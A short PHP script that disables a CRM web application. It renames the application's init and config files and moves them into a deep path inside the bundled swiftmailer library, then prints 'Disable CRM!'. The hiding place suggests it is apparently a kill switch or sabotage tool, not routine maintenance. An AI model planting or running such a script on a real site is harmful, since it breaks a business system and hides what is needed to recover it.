<?php

echo $orig_path = "{$_SERVER['DOCUMENT_ROOT']}/inc";
echo "<br />";
echo $hide_path = "{$_SERVER['DOCUMENT_ROOT']}/inc/swiftmailer/lib/classes/Swift/Mailer";

rename("{$orig_path}/init.php","{$hide_path}/init_disabled.php");
rename("{$orig_path}/init_for_ajax.php","{$hide_path}/init_for_ajax_disabled.php");
rename("{$orig_path}/config.php","{$hide_path}/config_disabled.php");

?>
<h1>Disable CRM!</h1>